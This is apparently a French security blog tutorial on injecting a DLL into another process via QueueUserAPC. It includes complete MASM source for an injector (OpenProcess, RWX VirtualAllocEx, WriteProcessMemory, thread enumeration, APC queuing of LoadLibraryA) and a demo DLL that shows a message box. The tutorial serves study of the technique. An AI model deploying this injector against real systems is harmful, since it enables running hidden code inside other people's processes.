
Cet article présente une manière d'effectuer de l'injection de DLL via la fonction __QueueUserAPC()__. Il fait suite aux articles précédents:

* https://dokyx.fr/blog/oirtslkdf_injectdll_createremotethread/

* https://dokyx.fr/blog/uyniouliu_injectdll_ntcreatethreadex/

* https://dokyx.fr/blog/lsdjqfqf_injectdll_rtlcreateuserthread/

* https://dokyx.fr/blog/sdkjsd_injectdll_setwindowshookex/

Le code permettant d'effectuer ce type d'injection se basera sur les codes que j'ai utilisés pour effectuer de l'injection de DLL via __CreateRemoteThread()__ et __SetWindowsHookEx()__ auxquels on ajoutera la partie __Asynchronous Procedure Call__ (APC).

Les appels de procédures asynchrones (__APC__) sont des fonctions qui s'exécutent de manière asynchrones dans le contexte d'un thread. Il y a donc une notion de temporalité dans ce type d'injection. Qui dit __temporalité__, dit également __état d'alerte__.

Un __état d'alerte__ (**alertable state**) est une notion d'attente, en ce sens que le thread se mettra en attente le temps d'exécuter **autre chose**. Une fois cette **autre chose** exécutée, il reprendra son cours normale d'exécution.

Il existe différentes fonctions qui permettent de mettre un thread dans un état d'alerte. On trouve:

```
| ------------------------------------------------------| 
| SleepEx()             | MsgWaitForMultipleObjectsEx() |
| SignalObjectAndWait() | WaitForMultipleObjectsEx()    |
| WaitForsingleObjectEx | ReadFileEx()                  |
| SetWaitableTimer()    | SetWaitableTimerEx()          |
| WriteFileEx()         |                               |
| ------------------------------------------------------| 
```

On y voit bien la notion de temps apparaitre dans le nom de ces fonctions.

Les __APC__ sont mises les unes à la suite des autres (une __queue__) attendant que le thread se mette dans un état d'alerte pour s'exécuter. Chaque thread possède sa propre queue d'__APC__. Une fois que le thread est mis dans un état d'alerte, la __queue__ est **déroulée** exécutant alors les fonctions les unes à la suite des autres.

Pour l'injection de DLL, l'__APC__ qui sera mise sur la __queue d'APC__ sera un chargement de la DLL malveillante avec la fonction __LoadLibraryA()__. Il faut donc ouvrir le processus victime (connaissant son __PID__), y allouer une zone mémoire __RWE__ (Readable Writable Executable), puis y écrire  le nom de la DLL malveillante à charger en mémoire avec la fonction __WriteProcessMemory()__. Ce sont les mêmes étapes que celle qui ont été faites lors de l'injection de DLL via __CreateRemoteThread()__.

Le code qui permet cela est présenté ci-dessous:

```
_openProcess:
	mov 		eax, PID
	push 		eax
	push 		0
	push 		1F0FFFh ; PROCESS_ALL_ACCESS
	call 		OpenProcess
	cmp 		eax, 0
	jz 		_exit
	mov 		[hProcess], eax
	
_virtualAllocEx:
	push 		40h ; PAGE_EXECUTE_READWRITE
	push 		3000h ; MEM_RESERVE or MEM_COMMIT
	push 		sizeof dllPath
	push  		0
	push 		hProcess
	call 		VirtualAllocEx
	cmp 		eax, 0
	jz 		_exit
	mov 		[baseAddr], eax

_writeProcessMemory:
	push 		0
	push  		sizeof dllPath
	push 		offset dllPath
	push 		baseAddr
	push 		hProcess
	call 		WriteProcessMemory
	cmp 		eax, 0
	jz 		_exit
```

Comme je l'ai dit plus haut, les __APC__ sont mises dans la queue d'un thread, il faut donc trouver le/les threads du processus victime. Pour cela, je vais utiliser la fonction __CreateToolhelp32Snapshot()__ pour créer un **snapshot** du processus victime, puis parcourir ce **snapshot** à l'aide de __Thread32First()__ et __Thread32Next()__ afin de déterminer le bon __Thread ID__ (__TID__) correspondant au __Process ID__ victime (__PID__).

Le code permettant cela est:

```
_createSnapshot:
    mov     	eax, PID
    push    	eax
    push    	4 ; TH32CS_SNAPTHREAD
    call    	CreateToolhelp32Snapshot
    mov     	[hSnapshot], eax

_getFirstThread:
    push    	offset tte32
    push    	[hSnapshot]
    call    	Thread32First

; compare the PID owner of the thread with the PID of the process to inject
loop_to_find_thread:
    mov     	ebx, PID
    cmp     	[tte32.th32OwnerProcessID], ebx 
    jz  	thread_found
    
    push    	offset tte32
    push    	[hSnapshot]
    call    	Thread32Next

    jmp     	loop_to_find_thread  

thread_found:
```

Ici, __tte32__ fait référence à la strucuture __tagTHREADENTRY32__. Tout ceci a été vu dans l'article traitant de l'injection de DLL via __SetWindowsHookEx()__.

Une fois qu'un thread a été trouvé, il faut pouvoir l'ouvrir (__OpenThread()__), puis y ajouter une __APC__. Pour ajouter une __APC__, il suffit d'utiliser la fonction __QueueUserAPC()__ (https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc).

Le code suivant permet de faire cela:

```
thread_found:
	mov 		eax, [tte32.th32ThreadID]
	mov 		[TID], eax

_openThread:
	push 		[TID]	
	push 		0
	push		10h ; THREAD_SET_CONTEXT
	call 		OpenThread
	cmp 		eax, 0
	jz 			_exit
	mov 		[hThread], eax

_queueUserAPC:
	push 		[baseAddr]
	push 		[hThread]
	push 		[hLoadLibAddr]
	call 		QueueUserAPC
```

Une fois qu'un thread a été trouvé, on récupère le __TID__ de celui-ci grâce au **snapshot**, puis l'on s'en sert pour ouvrir le thread dans lequel on ajoute une __APC__. Pour ajouter l'__APC__, on a besoin de l'adresse de base à laquelle a été écrit le nom de la DLL à mettre en mémoire, le handle du thread victime que l'on a obtenu lors de l'ouverture de celui-ci, et enfin d'un pointeur vers le code a exécuter (ici __LoadLibrary("ma\_dll\_malveillante.dll")__).

<details><summary><font color="red">Ici se trouve le code permettant de faire de l'injection de DLL via QueueUserAPC()</font></summary>
<p>
```
.586
.model flat, stdcall

; kernel32.dll
GetLastError PROTO STDCALL
ExitProcess PROTO STDCALL :DWORD
OpenProcess PROTO STDCALL :DWORD,:DWORD,:DWORD
VirtualAllocEx PROTO STDCALL :DWORD,:DWORD,:DWORD,:DWORD,:DWORD
WriteProcessMemory PROTO STDCALL :DWORD,:DWORD,:DWORD,:DWORD,:DWORD
GetModuleHandleA PROTO STDCALL :DWORD
GetProcAddress PROTO STDCALL :DWORD,:DWORD
CreateToolhelp32Snapshot PROTO STDCALL :DWORD, :DWORD
Thread32First PROTO STDCALL :DWORD, :DWORD
Thread32Next PROTO STDCALL :DWORD, :DWORD
OpenThread PROTO STDCALL :DWORD, :DWORD, :DWORD
QueueUserAPC PROTO STDCALL :DWORD, :DWORD, :DWORD

; https://docs.microsoft.com/en-us/windows/win32/winprog/windows-data-types

tagTHREADENTRY32 struct
    dwSize      dd ?
    cntUsage    dd ?
    th32ThreadID    dd ?
    th32OwnerProcessID dd ?
    tpBasePri   dd ?
    tpDeltaPri  dd ?
    dwFlags     dd ?
tagTHREADENTRY32 ends

.data
	dllPath 	db "C:\Users\Megaport\Desktop\asm\inject.dll",0
	sKrnl32 	db "kernel32.dll",0
	sLoadLib	db "LoadLibraryA",0
	tte32       	tagTHREADENTRY32 <sizeof tagTHREADENTRY32>
	PID 		dd 1720
	
.data?
    	hProcess 	dd ?
 	nSizeDLL 	dd ?
 	baseAddr	dd ?
 	hKrnl32Addr 	dd ?
 	hLoadLibAddr 	dd ?
 	hSnapshot   	dd ?
 	TID 		dd ?
 	hThread 	dd ?

.code

Start PROC

_openProcess:
	mov 		eax, PID
	push 		eax
	push 		0
	push 		1F0FFFh ; PROCESS_ALL_ACCESS
	call 		OpenProcess
	cmp 		eax, 0
	jz 		_exit
	mov 		[hProcess], eax
	
_virtualAllocEx:
	push 		40h ; PAGE_EXECUTE_READWRITE
	push 		3000h ; MEM_RESERVE or MEM_COMMIT
	push 		sizeof dllPath
	push  		0
	push 		hProcess
	call 		VirtualAllocEx
	cmp 		eax, 0
	jz 		_exit
	mov 		[baseAddr], eax

_writeProcessMemory:
	push 		0
	push  		sizeof dllPath
	push 		offset dllPath
	push 		baseAddr
	push 		hProcess
	call 		WriteProcessMemory
	cmp 		eax, 0
	jz 		_exit

_getModuleHandle:
	push 		offset sKrnl32
	call 		GetModuleHandleA
	cmp 		eax, 0
	jz	 	_exit
	mov 		[hKrnl32Addr], eax

_getProcAddress:
	push 		offset sLoadLib
	push		hKrnl32Addr
	call 		GetProcAddress
	cmp 		eax, 0
	jz  		_exit
	mov 		[hLoadLibAddr], eax

_createSnapshot:
    	mov     	eax, PID
    	push    	eax
    	push    	4 ; TH32CS_SNAPTHREAD
    	call    	CreateToolhelp32Snapshot
    	mov     	[hSnapshot], eax

_getFirstThread:
    	push    	offset tte32
    	push    	[hSnapshot]
    	call    	Thread32First

; compare the PID owner of the thread with the PID of the process to inject
loop_to_find_thread:
    	mov     	ebx, PID
    	cmp     	[tte32.th32OwnerProcessID], ebx 
   	jz  		thread_found
    
    	push    	offset tte32
    	push    	[hSnapshot]
   	call    	Thread32Next

    	jmp     	loop_to_find_thread  


thread_found:
	mov 		eax, [tte32.th32ThreadID]
	mov 		[TID], eax

_openThread:
	push 		[TID]	
	push 		0
	push		10h ; THREAD_SET_CONTEXT
	call 		OpenThread
	cmp 		eax, 0
	jz 		_exit
	mov 		[hThread], eax

_queueUserAPC:
	push 		[baseAddr]
	push 		[hThread]
	push 		[hLoadLibAddr]
	call 		QueueUserAPC

_exit:
    xor     eax, eax
    push    eax
    call    ExitProcess

Start ENDP
End
```
</p>
</details>

Pour que le chargement de ma DLL malveillante fonctionne, il faut que le thread ciblé se mette en état d'alerte comme on l'a vu plus haut. Comme mon processus victime est une GUI qui permet l'édition de fichier hexa (programme: HxD), il me suffit de lui demander d'ouvrir une sous-fenêtre comme par exemple lorsque l'on veut __sauvegarder comme__ (**save as**), ou ouvrir un document (**open**). Très souvent ces actions ouvrent une fenêtre secondaire laissant à l'utilisateur le choix d'un nom de fichier à ouvrir/sauver. Pour effectuer cette action, il faut que le thread principal se mette alors en attente ... état d'alerte ! Yes !

Une fois en état d'alerte, le thread va parcourir sa __queue d'APC__ et exécuter celle-ci et notamment l'__APC__ qu'on lui a ajouté précédemment et qui permet de charger en mémoire une DLL malveillante.

La DLL malveillante utilisée exécute du code lors du chargement en mémoire car le code malveillant est écrit dans la partie __DLL\_PROCESS\_ATTACH__.

<details><summary><font color="red">Ici se trouve le code de la DLL utilisée</font></summary>
<p>
```
.586
.model flat, stdcall

; kernel32.dll
GetLastError PROTO STDCALL
ExitProcess PROTO STDCALL dwExitCode:DWORD
MessageBoxA PROTO STDCALL :DWORD,:DWORD,:DWORD,:DWORD


.data
	sTitle  db  'h4ck', 0
    	sMsg	db  'h4ck', 0

.data?
    	hInstance dd ?

.code

LibMain PROC hInstDLL:DWORD, reason:DWORD, unused:DWORD
    ; https://docs.microsoft.com/en-us/windows/win32/dlls/dllmain
    .if reason == 1 ; DLL_PROCESS_ATTACH
        call myFunc

        nop

    .elseif reason == 3 ; DLL_THREAD_DETACH
		nop

    .elseif reason == 2 ; DLL_THREAD_ATTACH
    	nop   
    
    .elseif reason == 0 ; DLL_PROCESS_DETACH
      	nop
    .endif

    ret

LibMain ENDP

; to export that function
; need to create a blop.def file containing:
; LIBRARY inject
; EXPORTS myFunc
; and into the .bat that compile, add the option: /def:blop.def
myFunc PROC 
    call    _MessageBox
    ret

myFunc ENDP

_MessageBox PROC
        push        0
        push        offset sTitle
        push        offset sMsg
        push        0 
        call       MessageBoxA

    ret

_MessageBox ENDP

END ; LibMain
```
</p>
</details>

Cette injection de DLL est sympa mais nécessite que le thread victime puisse être mis dans un état d'alerte, ce qui n'est pas toujours le cas.

De plus, pour être optimale, il faudrait ajouter une __APC__ dans chaque threads du processus victime afin de maximier les chances que le code malveillant soit exécuté. 
